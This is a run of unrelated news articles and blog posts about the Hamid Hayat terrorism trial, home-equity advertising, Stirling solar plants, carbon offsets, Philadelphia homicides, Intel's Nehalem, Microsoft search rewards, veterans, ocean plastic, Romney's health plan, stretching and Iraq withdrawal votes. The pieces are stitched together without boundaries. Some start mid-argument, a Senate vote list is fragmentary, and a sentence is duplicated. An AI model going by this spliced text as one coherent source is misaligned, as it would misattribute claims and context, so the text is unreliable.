CAM :: PDF , by Clotho Advanced Media , is like PDF :: Reuse more focused on reading and manipulating existing PDF documents .
However , it can work on multiple files at the same time .
Use it if you need more features than PDF :: Reuse actually provides .

Opinion
The phantom terrorist camp
The sentencing of Hamid Hayat to 24 years in prison has been hailed by federal authorities as a great day in the war on terrorism .
He was , they say , trained and ready to inflict " violent jihad " against Americans .
But there is a missing element in this case that has bothered me ever since Hayat was arrested in June 2005 as part of the celebrated bust of what the FBI then claimed was an active al Qaeda cell in the Central Valley town of Lodi .
The government has never explained what became of that terrorist camp in Pakistan where Hayat supposedly was trained to kill .
If investigators were certain enough of its existence and lethality to send one of its trainees to prison for 24 years , then where was the follow - up announcement of it being obliterated with smart bombs or raided by U.S. special forces with - dare I suggest ?
- the cooperation of a Pakistani government that is getting $ 10 billion a year in our tax dollars to help us fight terrorism ?
Did the terrorists disperse or set up camp elsewhere ?
Is the camp operating today ?
After all , if that camp posed as much of a threat to Americans as federal authorities claim , then it hardly seems plausible that its danger evaporated with the detention of a 25 - year - old cherry - plant worker from Lodi .
I put the question about the fate of the Pakistan camp to FBI headquarters in Washington , which had put out a 21 - paragraph press release about last week 's sentencing of Hayat on one count of providing material support to terrorists and three counts of making false statements to the FBI .
An FBI spokesman in Washington suggested I contact the FBI office in Sacramento , which investigated the case .
The FBI office in Sacramento said I would need to ask the U.S. attorney 's office that prosecuted Hayat .
I then called Assistant U.S. Attorney Robert Tice - Raskin and asked him what happened to the camp .
There was a long silence at the other end of the phone .
" I 'm pausing , " he said , finally , to contemplate whether there was " anything in public record at the trial related to that . "
In a follow - up e-mail , the U.S. attorney 's office said it had " no further information that is responsive to your request " about the camp 's status .
Hayat 's trial did not provide much insight about the camp he allegedly attended .
A Department of Defense imagery expert said he was " confident " that satellite images taken in 2001 and 2004 of buildings in the vicinity of Balakot were of a militant training camp .
The long - lens view of the camp was curious , considering that Balakot is not in one of those remote tribal regions along the Afghanistan border .
It 's a 60 - mile drive from the capital city of Islamabad .
There were plenty of other unsettling aspects of the trial .
The government 's case against Hayat rested largely on a confession he made after hours of intense interrogation .
There is no doubt that he traveled to Pakistan and that he had a fascination with anti-American jihadists .
Prosecutors offered his collection of magazine and newspaper stories - as well as his recorded conversations with an informant who was paid $ 230,000 of our tax dollars - to support their contention that he was a potential evildoer .
Hayat had " a jihadi heart , " the prosecution argued in closing statements .
However , the prosecution offered no direct evidence to corroborate Hayat 's admission of attending a terrorist training camp .
Also , his statements to authorities were rife with bizarre details and contradictions .
Hayat said aspiring terrorists trained at the camp with high - powered rifles and swords .
But the rail - thin Hayat said he struggled with the weight and power of firearms and spent most of his time washing vegetables and peeling onions .
Questions persist about the adequacy of his defense and the objectivity of the jury .
The jury foreman 's post - trial comments to the Atlantic Monthly - admitting the jury 's doubts about whether Hayat was a genuine threat , while explaining its unwillingness to take a chance in this age of terrorism - added to perception that the conviction amounted to an act of " preventive detention , " a concept that is supposed to be foreign to this free society .
The foreman also opined that it's " absolutely " better to risk convicting an innocent man than to exonerate a guilty one when it comes to terrorism .
" What ( the prosecution ) presented was just preposterous , " said Dennis Riordan , a renowned San Francisco appellate attorney who has taken up Hayat 's cause .
Put aside the questions about Hayat 's trial for the moment .
Let 's assume that everything the government alleged was true :
That there was - or perhaps is - a terrorist camp in the Balakot area preparing jihadists for battle against Americans .
I do n't feel the least bit comforted by an FBI press release about the conviction of a guy who was washing vegetables there .
I want to know that the camp - and its leaders - are out of business .

Does this sound foolish ?
It should , but what is even more foolish is that this is the advice I heard on the radio during my drive to work this morning .
One of the regional banks around here was running a commercial that was basically giving this advice .
I do n’t have an exact transcript , but this is basically what it said :
Need to pay for college ?
Use your home !
Ca n’t afford a new car ?
Use your home !
Paying for a wedding ?
Use your home !
Why wait to gather up the money when you can tap into the money you already have in your home ?
By taking a home equity loan you can access money that is yours at an affordable rate .
You may even be able to deduct the interest !
Call now to find out more …
At the very end they threw in a real quick disclaimer that basically said , “ only borrow what you can afford to pay back . ”
Is it just me , or is this a reckless advertisement ?
I would expect to see this coming in the form of a spam email or a late - night infomercial , but from what I would consider a reputable bank –I ’m just very surprised .
Why This is a Bad Idea
Hopefully the reasons are obvious , but if not , let ’s look at some of the reasons this is n’t a good idea .
First and foremost , this is taking on more debt , and in their example about paying for college , this is absolutely ridiculous .
A home equity loan is going to come with fees , and probably have an interest rate that far exceeds what a student loan would be , not to mention the favorable repayment terms on a student loan .
In addition , whether the loan is used for college or whatever , it is secured by your home .
We already know that we ’re not in the strongest housing market , and if someone is extending themselves by taking out a home equity loan , they are increasing the likelihood of foreclosure in the event of a financial downturn .
Finally , this is simply promoting borrowing over saving .
They diminish the importance of saving and tell you that your home is virtually a savings account just waiting to be tapped .
This could n’t be further from the truth and is reinforcing the buy now , pay later way of thinking that has become so prevalent .
Undermining Sound Financial Advice
Ads like these really undermine what we are trying to accomplish , and it is a shame that some banks are contributing to the problem .
As a whole , we already have problems with people saving money and carrying too much debt , not to mention the whole subprime mess , yet there are still companies that will do anything to make a few extra bucks .
What I ’d like to see is a bank offering some sort of reward or incentive for opening a savings account with systematic deposits .
I know there are a few that offer a modest sign - up bonus , but doing something to encourage a good financial decision could in fact be more lucrative than a quick home equity loan .
A customer who begins saving is going to be a happy customer .
Then , as they begin to gain control over their finances and bring more assets to the bank , they are more likely to deal with the bank for future financial needs ( mortgage , credit card , business accounts , etc. ) .
But instead of thinking long - term , it looks like they are happy churning products that are n’t suitable for a few bucks , which could eventually ruin someone ’s finances and that person as a customer forever .

The barren deserts of Southern California are known for relentless sunshine and miles of empty space – the perfect combination for the world 's most ambitious solar - energy projects .
Two Southern California utility companies are planning to develop a pair of sun-powered power plants that they claim will dwarf existing solar facilities and could rival fossil - fuel - driven power plants .
Southern California Edison and San Diego Gas & Electric are working with Stirling Energy Systems , a Phoenix startup that has paired a large and efficient solar dish with a 200 - year - old Stirling engine design .
Stirling Energy Systems is planning to build two separate solar farms , one with the capacity to generate 500 megawatts of electricity in the Mojave Desert near Victorville , California , for SoCal Edison , and a 300 - megawatt plant in the Imperial Valley , near Calexico , California , for SDG&E .
The utilities have signed 20 - year deals to buy all the juice the farms can turn out , and have options to expand the plants if they are successful .
" Without question , this will be the largest solar project in the world , " said Gil Alexander , a spokesman for SoCal Edison .
" It will be bigger than all U.S. solar - energy projects combined . "
Alexander said traditional coal or gas plants typically generate 500 to 1,000 megawatts , and that current solar farms are much smaller – generally in the 35 - to 80 - megawatt range .
At the end of 2004 , the United States had only 397 megawatts of solar - energy capacity , according to the U.S. Department of Energy 's Energy Information Administration .
" There is a possibility with this project that solar energy could go commercial in a big way for the first time , " said Alexander .
" It 's playing in the big leagues . "
Instead of using panels of photovoltaic cells – solar power 's mainstay technology for decades – Stirling Energy Systems uses 40 - foot - tall curved dishes that focus the sun 's energy onto Stirling engines .
Also called an external heat engine , the Stirling engine is a completely sealed system filled with hydrogen .
Its design dates to 1816 , and it 's named for its inventor , a Scottish minister named Robert Stirling .
The focused solar energy , which can reach 1,350 degrees Fahrenheit , heats the hydrogen , making it expand and drive the engine 's four pistons .
Though Stirling engines have been around for almost two centuries , there have been few efforts in the past to harness the sun to run them , said Stirling Energy Systems CEO Bruce Osborn .
Osborn said the Stirling dishes are 30 percent efficient – 30 percent of the sun 's energy is converted into electricity – which is two to three times as efficient as conventional photovoltaic cells .
" Solar panels are more common , and they have gotten more efficient , but they still have a long way to go , " he said .
Osborn said his company 's dishes are easy to maintain because the engine is a closed system that never needs to be refilled – an important factor for a large - scale facility in the middle of the desert .
In fact , the only resource it consumes is " a little bit of water to wash the mirrors off every few weeks , " he said .
The company is currently operating a six - dish test site at Sandia National Laboratories to showcase the concept , but the SoCal Edison and SDG&E plants are Stirling Energy Systems ' first commercial contracts .
The first phase of the SoCal Edison project will be to build a 1 - megawatt test site using 40 dishes , which should be complete by spring 2007 .
Construction on the full , 500 - megawatt facility is expected to begin in mid-2008 , and should take three to four years .
Each dish can produce up to 25 kilowatts , and the site will eventually have 20,000 dishes stretching across 4,500 acres of desert .
Stirling plans to begin construction on SDG&E 's 300 - megawatt project in late 2008 , and it should take about two years to install the 12,000 dishes covering about 2,000 acres .
None of the companies would give a price for building the solar sites or disclose the rates the utilities will pay for power , but both said the cost would be similar to traditional coal or gas .
But as oil prices go up , so could the cost of electricity from fossil fuels .
" Soon , solar may be less expensive , " Osborn said .
Joel Makower , co-founder of market - research firm Clean Edge , said Stirling Energy Systems ' solar - thermal power systems are impressive but unproven .
One promising sign is the utility companies ' level of commitment to the new technology .
" This is all on paper so far , " he said .
" They have n't delivered anything yet .
And until they do , we can't say what it will cost . "
Still , Makower said he was optimistic .
" Photovoltaic was the first - generation , utility - scale solar technology , " he said .
" The Stirling engine looks like it will be the second generation . "

Offset Your Conscience
With so much recent talk about carbon gas emissions and their impact on the environment it ’s hard not to feel but a little self - conscious about jumping on a plane to embark on a vacation or business trip .
While we do n’t currently have alternatives for all our flying needs ( we can choose to do a video conference over traveling to a business meeting but it would take the better part of a week to bus it down to Guatemala from Canada , by which time you would have to turn right back around if you ’re on the typical 10 day vacation ) , there are things we can do to travel with a cleaner , greener conscience through ' climate - neutralizing ' initiatives by companies like Offsetters .
Offsetters , a Canadian based company , has an affiliate program with WestJet whereby if you book a ticket on Offsetters ’ site ( guaranteed to be the same price as if you book directly on WestJet ’s site ) you will also gain a carbon credit , which is then invested by Offsetters on projects that will reduce carbon gas emissions , resulting in ‘ climate neutral ’ travel .
You can also use their flights calculator to figure out how much damage you are contributing each time you hop on a plane .
This gives you the total distance traveled , carbon gas emissions for your trip , and the cost of these emissions .
Traveling from Toronto to Seattle , for example , a distance of 3304 kms. , results in 0.722 tonnes of CO2 , a cost of $ 13.63 .
You can choose to buy offset credits for your CO2 cost that will be contributed to projects that will lower gas emission around the world , such as efficient cooking stoves in Honduras to help preserve their natural resources and improve their health standards , or restoring the rainforest in Uganda .
The offset may not be perfect , given that some of your contribution must be used to cover overhead costs , but it certainly is a move in the right direction .
Anyone can buy credits online from Offsetters and the contributions are spread among projects around the globe .
For a list of other companies going ‘ climate neutral ’ go to David Suzuki ’s site .

PHILADELPHIA , Pennsylvania ( CNN ) -- Isaac
Diaz walks through the toughest parts of North Philadelphia each day on his way to and from high school .
But what really scares the 18 - year - old senior is lying in his own bed at night .
He can hear the gunshots then .
" Last year it was n't so often .
Now it 's as often as every night , " Diaz recently told CNN .
" It might be your best friend dying , and you do n't even know about it . "
Out on the street , Diaz said , a casual stroll can suddenly turn deadly .
( Watch Diaz explain how he lives with daily gunfire )
" You do n't know what 's going to happen , " he said .
" You do n't know if you 're walking in the neighborhood and a guy from middle school sees you and he just had a bad incident with his mother and father and he 's walking around with a gun . "
" I'm afraid every day . "
Philadelphia is just one of the nation 's cities trying to deal with a murder spike .
As of Wednesday , 150 people have been slain in the city , compared to 140 by this time last year .
The numbers put Philadelphia on a pace well ahead of a bloody 2006 , when 406 people were slain by others in the so - called City of Brotherly Love .
It was the first time homicides topped the 400 mark since 1990 .
( Watch a mother grieve over a son shot for his car )
Nationally , violent crime is spiking , too .
FBI data from December , the most recent statistics available , show murders and robberies rose by 3.7 percent nationwide during the first six months of 2006 .
Those findings came on top of a 2.2 percent crime hike in 2005 -- the first increase since 2001 .
Guns plentiful
The spike prompted Attorney General Alberto Gonzales to order a study of violence in 18 cities .
The results were released earlier this week , when Gonzales announced that the Justice Department would spend $ 50 million to combat urban violence .
The Justice Department concluded that the increased violence is caused by a younger and more violent generation of criminals who have easy access to guns .
Many are loosely organized into street gangs and crews .
In Philadelphia , police and civic activists point to several factors , including poverty and drugs .
But by far the biggest catalyst , they say , is the availability of guns .
Young men who grow up angry with few opportunities use guns to win status on the streets , said Greg Bucceroni , of Men United for a Better Philadelphia , which mentors at - risk teens , counsels crime victims and sponsors community events to try to reduce violence .
( Watch Bucceroni talk about how why the violence is getting worse )
" They feel that 's how they get respect , so the level of violence escalates , " he said .
Bucceroni works for the city but also spends much of his time volunteering to help guide kids who have gotten into trouble .
An activist since the early 1980s , he has seen the changes .
" In the 70s , I mean , if somebody came up and they had a zip gun -- which was a homemade gun -- that was big time , " he said .
" Now if , if you do n't have an AK - 47 or a sawed - off shotgun or a 9 mm , even if you pull out a .38 , they laugh at you because , ' Is that all you 've got ? '
That is their mentality when now people are carrying automatic handguns . "
The city is trying several initiatives to help reduce the murder rate , including hiring police and truant officers , and redeploying police officers to problem areas .
' Hometown security '
Police Commissioner Sylvester Johnson told CNN the police can't stop the violence by themselves .
" The clergy has to get involved , " he said .
" The business people have to get involved .
The politicians have to get involved .
The community has to get involved .
If you are only going to depend on law enforcement it is not going to change the quality of life . "
As he speaks , his passion grows .
" A 9 - year - old boy is killed on the streets of Philadelphia , no one comes forward .
Where a 4 - year - old girl is shot no one comes forward .
Where a house is firebombed , six people killed -- four under the age of 5 years -- no one comes forward .
The community has to come to realize by not coming forward they are only hurting themselves , " Johnson said .
Besides spending $ 50 million this year to take guns and drugs off the streets , the Justice Department will push Congress to enact laws to let the federal government better investigate and prosecute violent crime , Gonzales said .
Johnson welcomes the help , but said cities suffered when federal priorities shifted after 9/11 .
" Funds coming into the city have been cut -- not just for policing but for education , for jobs , for health care , for all kinds of things , " he said .
" All of the money is going overseas -- again homeland security is very important , but hometown security is just as important . "

More Nehalem
When we published today 's initial coverage we gave Nehalem very short treatment , simply due to a lack of time , but now that things have slowed down a bit we can touch on the gravity of today 's Nehalem demonstrations .
We 've talked in the past about Intel 's incredibly strong roadmap and how it 's firing on all cylinders , today 's demonstration is perfect indication of that .
Penryn is n't even out the door yet and Nehalem is design - complete , undergoing testing and already running two major OSes according to Intel .
We 've yet to lay our hands on AMD's Phenom , much less give you more than a crude set of performance expectations based on server hardware , needless to say Intel is doing to AMD , what AMD did to Intel for years while the Pentium 4 struggled to perform .
Let 's say that again : Intel is showing an architecture that wo n't be out until the end of next year , today .
A mere four hours after the first Nehalem demo , Intel was back with another one and this one , even more impressive .
Nehalem uses Intel 's new QuickPath interconnect , formerly known as CSI , and a direct competitor to AMD 's Hyper Transport .
Doing away with the Front Side bus and implementing a point - to - point interconnect is a huge feature of Nehalem , especially for the enterprise market , and Intel 's second demo showcased just that .
The second Nehalem system featured two quad - core Nehalem processors running in a two - socket system , the two sockets being connected via QuickPath .
Each quad - core Nehalem has SMT enabled , meaning each core can work on two threads simultaneously , so the entire box can simultaneously work on 16 threads as is evidenced by the obligatory task manager screenshot :
Obviously we have no performance data or clock speed information , we 'd expect both to be quite low at this point but the fact that we 're seeing the demo today is quite good .
Despite worries of AMD being uncompetitive going forward , Intel seems to be proceeding according to plan , which is exactly what we want to see .
Nehalem will also add 7 new SSE4 instructions to its reportoire , note the diagram showing direct connections between processors and memory , very AMDesque
The Nehalem launch is a very important one for Intel as it is the first full repetition of its 2 - year architectural cycle ( tick - tock model ) ; many wondered if Intel could pull it off , and we 'll find out by this time next year .
Microsoft is seeking 30 companies , each with at least 5,000 PCs , who are willing to sign up and install on employees ’ computers a small program — a “ browser helper object ” — that will count the number of searches performed with Microsoft Live Search .
The notion that a lagging search engine would offer monetary incentives directly to end users is not wholly new .
A year ago , Yahoo appeared to be readying a rewards program for its search users that would be offered first to Yahoo Mail customers .
A Yahoo survey , asking what would entice e-mail customers to designate Yahoo as their primary search engine , offered ideas like five free music downloads a month , a discount to Netflix , or 250 frequent - flier miles each month that could be transferred to most major airline mileage programs .
After completing the survey , Yahoo decided not to start the service .
Whether it had discovered that its own e-mail customers withheld enthusiasm for the idea of making Yahoo their default search engine is not known .
A company spokeswoman last week declined to discuss the survey or the subsequent decision to abort the plans for a rewards program .
Microsoft also tested the idea of rewarding search users last year , when its MSN unit put up a promotional Web site , “ MSN Search and Win , ” which provided instant prizes ranging from a Starbucks gift certificate to a Panasonic high - definition television .
The promotion lasted about five months and , according to Mr. Sohn , “ drove tens of millions of queries and for a relatively small amount of money . ”
Both Yahoo and Microsoft ’s MSN were thinking about the problem of customer acquisition in the same way .
But Microsoft ’s new program brings an entirely new approach to acquiring customers : buying them at wholesale , instead of retail .
Microsoft need only persuade the I.T. department in order to achieve broad adoption at a large company , rather than slogging , cubicle by cubicle , to win loyalty one employee at a time .
If the employees prove recalcitrant and continue to use “ the incumbent , ” that will be for I.T. to handle .
Microsoft , stuck in distant third place and losing ground to the leader with every lap , should realize that the airlines ’ frequent - flier programs may not work well as a model for the software business .
Mara Lederman , an assistant professor of strategic management at the University of Toronto who has closely studied the airlines ’ programs , said one feature that has been essential to their popularity among business travelers is that customers earn the rewards but do not pay for the product — their employers do .
“ If the fare for your preferred airline is $ 100 more , you do n’t care because you do n’t pay , ” she said .
“ You just want the points because you want to take the family to Hawaii . ”

Who receives the best terrorist training in the world ?
It ’s not al - Qaida operatives or anybody else associated with Middle East organizations that the U.S. is pleased to label " terrorist . "
No , the best terrorist training in the world is provided by the U.S. military .
Everything that is taught in some squalid terrorist camp and much more is taught right here in the USA .
What do you think Special Forces , Delta Force , the Air Commandos , Marine Recon and the Navy Seals learn ?
They learn how to kill people and blow things up , how to practice escape and evasion , how to interrogate prisoners and to endure interrogation .
Every skill a terrorist needs is thoroughly taught by our own military .
If you wish to know how to make improvised explosive devices , you do n’t need to visit Afghanistan .
You can order official U.S. Army manuals , nearly all of which have been photocopied and offered for sale by mail or on the Internet .
These have been available for decades .
Even I could tell you how to kill a man and make it look like a heart attack , though I wo n’t .
After these men receive their training and practice their skills in real wars , they eventually return to civilian life .
But as civilians , they do n’t forget what they learned .
Their lethal education stays with them for the rest of their lives .
Timothy McVeigh , the young man who blew up the federal building in Oklahoma City , was Army - trained .
Year in , year out , the U.S. military turns out superbly trained men with all the skills and knowledge of a terrorist .
They eventually return to the civilian pool .
There must be thousands living amongst us right now .
Well , that being the case , it seems to me to behoove the U.S. government not to screw its veterans , to refrain from breaking promises and from providing them with shoddy or no treatment .
It behooves the U.S. government to make sure those who have mental problems receive the help they need .
Not every veteran who becomes embittered and goes off the deep end will have been a cook or a clerk .
I know of an amusing instance where a young construction worker made the mistake of pulling a knife on someone he assumed was a potbellied old man .
True , the man was graying and potbellied , but he had spent seven tours in the jungles of Vietnam and Cambodia and was more than a match for the knife wielder .
The young thug was lucky he ended up with only broken bones .
My friend could have killed him as easily as stepping on a roach .
When men wear civilian clothes , you do n’t know who they are or what they have been .
It pays to be civil and respectful .
We the American people owe a lot to our military members .
Not only have they fought our wars , but they have protected the Constitution .
I ’ve always said you will find more respect for the Constitution in the Pentagon than you will in the White House , the Supreme Court or Congress .
But there are other reasons to practice civility and respect , especially these days .
There was a stockbroker in South Florida who lost all of his client ’s money with bad investments .
Unfortunately , he learned his client was a hit man in the Witness Protection Program just before his client shot him to death at his desk .
Another friend of mine drove all the way across a large city just to punch out a telephone salesman who had hung up on him .
My friend thought that was rude , and he was not one to tolerate rude behavior .
In the meantime , I would n’t worry too much about some kid who tramps over to Pakistan for terrorist training .
He could get much better and more thorough training by joining the U.S. Army .

At the start of the Academy Award - winning movie " American Beauty , " a character videotapes a plastic grocery bag as it drifts into the air , an event he casts as a symbol of life 's unpredictable currents , and declares the romantic moment as a " most beautiful thing . "
To the eyes of an oceanographer , the image is pure catastrophe .
In reality , the rogue bag would float into a sewer , follow the storm drain to the ocean , then make its way to the so - called Great Pacific Garbage Patch - a heap of debris floating in the Pacific that 's twice the size of Texas , according to marine biologists .
The enormous stew of trash - which consists of 80 percent plastics and weighs some 3.5 million tons , say oceanographers - floats where few people ever travel , in a no-man 's land between San Francisco and Hawaii .
Marcus Eriksen , director of research and education at the Algalita Marine Research Foundation in Long Beach , said his group has been monitoring the Garbage Patch for 10 years .
" With the winds blowing in and the currents in the gyre going circular , it 's the perfect environment for trapping , " Eriksen said .
" There 's nothing we can do about it now , except do no more harm . "
The patch has been growing , along with ocean debris worldwide , tenfold every decade since the 1950s , said Chris Parry , public education program manager with the California Coastal Commission in San Francisco .
Ocean current patterns may keep the flotsam stashed in a part of the world few will ever see , but the majority of its content is generated onshore , according to a report from Greenpeace last year titled " Plastic Debris in the World 's Oceans . "
The report found that 80 percent of the oceans ' litter originated on land .
While ships drop the occasional load of shoes or hockey gloves into the waters ( sometimes on purpose and illegally ) , the vast majority of sea garbage begins its journey as onshore trash .
That 's what makes a potentially toxic swamp like the Garbage Patch entirely preventable , Parry said .
" At this point , cleaning it up is n't an option , " Parry said .
" It 's just going to get bigger as our reliance on plastics continues .
...
The long - term solution is to stop producing as much plastic products at home and change our consumption habits . "
Parry said using canvas bags to cart groceries instead of using plastic bags is a good first step ; buying foods that are n't wrapped in plastics is another .
After the San Francisco Board of Supervisors banned the use of plastic grocery bags earlier this year with the problem of ocean debris in mind , a slew of state bills were written to limit bag production , said Sarah Christie , a legislative director with the California Coastal Commission .
But many of the bills failed after meeting strong opposition from plastics industry lobbyists , she said .
Meanwhile , the stew in the ocean continues to grow .
The Great Pacific Garbage Patch is particularly dangerous for birds and marine life , said Warner Chabot , vice president of the Ocean Conservancy , an environmental group .
Sea turtles mistake clear plastic bags for jellyfish .
Birds swoop down and swallow indigestible shards of plastic .
The petroleum - based plastics take decades to break down , and as long as they float on the ocean 's surface , they can appear as feeding grounds .
" These animals die because the plastic eventually fills their stomachs , " Chabot said .
" It does n't pass , and they literally starve to death . "
The Greenpeace report found that at least 267 marine species had suffered from some kind of ingestion or entanglement with marine debris .
Chabot said if environmentalists wanted to remove the ocean dump site , it would take a massive international effort that would cost billions .
But that is unlikely , he added , because no one country is likely to step forward and claim the issue as its own responsibility .
Instead , cleaning up the Great Pacific Garbage Patch is left to the landlubbers .
" What we can do is ban plastic fast food packaging , " Chabot said , " or require the substitution of biodegradable materials , increase recycling programs and improve enforcement of litter laws .
" Otherwise , this ever - growing floating continent of trash will be with us for the foreseeable future . "
The workshop began in mid-July , with the arrival of nearly 50 visitors from Brazil , Ghana , Guatemala , Tanzania , Tibet and other countries .
Most of the $ 200,000 budget was provided by donations from individuals and private groups , including the National Collegiate Inventors and Innovators Alliance , which supports university programs to develop commercially viable products that advance society .
The workshop began with a lecture by Paul Polak , a psychiatrist turned entrepreneur , who develops simple solutions for the problems of the poor .
Dr. Polak , who has become something of a guru to the design revolution movement , railed against conventional charity and insisted that the route to prosperity lies in inventions that improve lives but mesh with existing lifestyles .
He laid out the principles of development from the bottom up , including the importance of first listening and watching , then following the old dictum “ small is beautiful ” with another , equally important one : “ cheap is beautiful . ”
The goal , he said , should be to improve a million lives , and to make technologies that can be sold and bought in increments — like a drip - irrigating system that can expand as a farmer ’s income rises .
Dr. Polak said in an interview that at least in the classroom , the push for such initiatives was coming from young people .
Ms. Smith said she wanted to avoid having the workshop end up as yet another academic exercise where the only outcome is often a set of paper proceedings or pledges .
This time , she said , the goal was “ no paper , just prototypes . ”

In fact , in the first days of the workshop , it seemed that the only paper in evidence was an ever - spreading , flower - petal array of blue , green , pink and yellow sticky notes on walls and blackboards .
The notes charted the progression from basic needs ( water , food , energy , health ) to specific issues ( a three - mile hike to and from the nearest water supply in a Tanzanian village , the lack of a well - testing kit that a Bangladeshi village clinic could afford ) .

On the presidential campaign trail , Mitt Romney points to healthcare reform as his major achievement as Massachusetts governor , presenting the plan as an example of how he used conservative principles to provide affordable health insurance for all state residents without a government takeover .
But he does not mention aspects of the plan that may hold less appeal for his Republican audiences .
For example , he decries " socialized medicine " and says the Massachusetts plan is " all a private initiative , a private - based , market - based healthcare " -- omitting the fact that the state and federal governments subsidize much of the overall cost and that a public board negotiated the benefits and prices that private insurers now offer .
He wows audiences by telling them that premiums for individuals dropped from $ 350 a month to $ 175 a month , without clarifying that those figures are for the lowest - cost plan available for 37 - year - olds and without mentioning that for many people , especially the elderly , premiums can be several hundred dollars more .
And he sometimes downplays the role that Democrats on Beacon Hill had in putting together the final plan .
The Massachusetts healthcare law is exceedingly complicated , and it would be difficult for Romney to explain all the nuances in a town hall - style meeting , or in TV or radio advertisements .
" What 's important about the Massachusetts healthcare law is that it 's working , and Mitt Romney got it done by reaching across the political aisle , " Romney spokesman Eric Fehrnstrom said yesterday .
" We have fewer uninsured , the cost of policies is coming down , and more and more people are taking personal responsibility for their own healthcare . "
His campaign also points out that the plan has been praised by conservative groups such as the Club for Growth .
Representatives from The Heritage Foundation worked with Romney on the plan and joined him for the bill signing .
Fehrnstrom said Romney plans to give a major healthcare speech on Friday to the Florida Medical Association in which he will discuss " the lessons learned in Massachusetts and how he can apply those . . . on a national basis . "
" He will go into much greater specifics than he does in his stump speech , " Fehrnstrom said .
But some of Romney 's critics and political foes -- all strong supporters of the state 's healthcare law -- say he is resorting to tricks used by candidates trying to put the best spin on their records : accentuating the positive , deleting difficult details , and taking too much credit .
" It is a creative reconstruction of the law and what actually happened . . . to fit his needs " in the presidential race , said John McDonough , executive director of the advocacy group Health Care For All .
Healthcare is n't the only area where Romney has tried to polish his record .
As he explored a presidential bid , he said he turned a $ 3 billion budget deficit into a surplus without raising taxes , even though state officials and independent analysts have said that the deficit figure was a projection and was overstated and that Romney used fee increases to close the gap .
Yesterday , he began airing a radio advertisement that suggests he cracked down on illegal immigrants by getting the authority to have State Police arrest them -- without noting that the policy was rescinded by his successor , Governor Deval Patrick , before it ever took effect .
How to Become More Flexible
For help on the splits , read Flexibility to the Max–Stretch your splits in 3 weeks !
You ’ve been stretching what seems like forever , but you still have n't got the splits down after a year or so .
It seems impossible , and you start asking yourself if you 're incapable of doing the splits .
Maybe the right question to ask is if you are stretching correctly , doing the right stretches , and stretching frequently enough .
Being able to do the splits is n't just based on being flexible in one area .
A lot of people tend to stretch the same muscles everyday , but never get the splits down .
This may because they are doing the wrong stretches .
Another possibility is that they are n't performing the stretches correctly .
Make sure you use a variety of stretches and also perform them correctly .
Stretching improperly wo n't do you any good .
Being flexible also requires a lot of stretching .
There are many ways to improve your flexibility .
You need to be stretching daily , for at least 15 minutes .
You can't just compensate and decide to stretch for two hours every Saturday .
It does n't work that way , you have to stretch daily in order to build up on it .
Your flexibility improves everyday , but it also digresses .
If you stretch once a week , you 'll become more flexible , but by the next week , you will lose all the flexibility that you gained .
That 's why you have to stretch daily , so that you build flexibility and do n't lose it .
One important tip for stretching is to do it after warming up .
Your muscles are much easier to stretch while they 're warm and it wo n't feel as painful while stretching cold .
You 'll get better results this way and have less risks of pulling a muscle .
Also try strengthening your legs .
Another tip is to stretch while at practice .
I know you probably warm up and stretch , but while stretching , you can't just talk to your friends and be in a stretching position while doing so .
You have to think about stretching and focus on becoming more flexible .
You can sit in a stretching position for hours and get no stretch at all .
You actually have to stretch to your limits in order to improve your flexibility .

WASHINGTON ( CNN ) -- President Bush will veto a defense appropriations bill being debated in the Senate if it includes an amendment setting a timetable for withdrawing U.S. troops from Iraq , the White House said Tuesday .
President Bush said Tuesday military commanders , not politicians , will lead a " new way " forward in Iraq .
Senate Democratic leaders have said they plan to bring forward an amendment from Sens. Jack Reed , D - Rhode Island , and Carl Levin , D - Michigan , that calls for beginning a redeployment of U.S. troops in as little as four months , to be completed by next spring .
House Democratic leaders announced late Tuesday that they would bring a similar proposal to a vote by the end of the week .
But in a policy statement issued Tuesday by the Office of Management and Budget , the White House said the proposed Reed - Levin amendment infringed on Bush 's authority as commander - in - chief and was " equivalent to setting a date for failure . "
Webb amendment vote Senators on Wednesday refused to bring to a vote an amendment written by Sen. Jim Webb , D - Virginia , that would set time limits between U.S. troop rotations in Iraq and Afghanistan , to give troops more time at home .
The tally was 56 to 41 , failing to receive the 60 votes required to cut off debate on the amendment so a vote could be held .

 Sen. Chuck Hagel , Nebraska
 Sen. Gordon Smith , Oregon
 Sen. Olympia Snowe , Maine

 Sen. Joseph Lieberman , Connecticut
Senators not voting :
 Sen. Sam Brownback , R- Kansas
 Sen. Tim Johnson , D - South Dakota
 Sen. David Vitter , R- Louisiana
" If the president were presented a bill that includes such provisions , he would veto the bill , " the statement said .
Senate Democrats are trying to attach the withdrawal timetable to the bill that funds the Defense Department for fiscal year 2008 .
To overcome procedural hurdles in the Senate , the Reed - Levin amendment would likely need backing from at least 10 Republicans , and -- despite recent cracks in GOP solidarity on the Iraq war -- it is unclear whether the proposal would draw enough GOP votes .
An aide to GOP Sen .
Olympia Snowe of Maine said Wednesday she would co-sponsor the Reed - Levin amendment .
Sen. Gordon Smith , R - Oregon , also backs the amendment , but other Republicans would need to join in to get it through the Senate .
Earlier this year , congressional Democrats tried a similar tactic , attaching a timetable proposal to an emergency war funding bill .
Bush vetoed the bill , and Democratic leaders eventually backed down and removed the language in May to move the measure forward .

The tally was 56 to 41 , failing to receive the 60 votes required to cut off debate on the amendment so a vote could be held .
Under the proposal by Jim Webb , D - Virginia , military personnel who return from deployments would have remained stateside for at least as long as they spent overseas , before they could be sent back .
Bush said Tuesday that military commanders , not politicians , should determine the course of the war in Iraq .
" Congress ought to wait for Gen .
Petraeus to come back and give us his assessment before they make any decisions , " Bush told a town hall meeting in Cleveland , Ohio .
In a brief statement earlier there , Bush said , " Troop levels will be decided by our commanders on the ground , not by political figures in Washington D.C. "
Gen . David Petraeus , the top U.S. commander in Iraq , has had the full number of troops requested under the so - called " surge " for only a few weeks , Bush said , and Congress should give Petraeus and his forces time to show results .
Petraeus is due to report to Congress in September about progress in Iraq .
An interim report coming this week will emphasize signs of hope in Iraq , including a drop in sectarian killings in Baghdad , the decision by tribal chiefs in Anbar province to move against al Qaeda terrorists and successful local elections , sources said Tuesday .
But it will also note the Iraqi government 's failure to pass major political changes , including sharing oil revenues , power - sharing among the country 's various ethnic and religious groups and letting supporters of deposed dictator Saddam Hussein 's Baath Party return to Iraq 's political life , the sources said .

From the Associated Press :
A majority of Iraqi lawmakers have endorsed a bill calling for a timetable for the withdrawal of foreign troops and demanding a freeze on the number of foreign troops already in the country , lawmakers said Thursday .

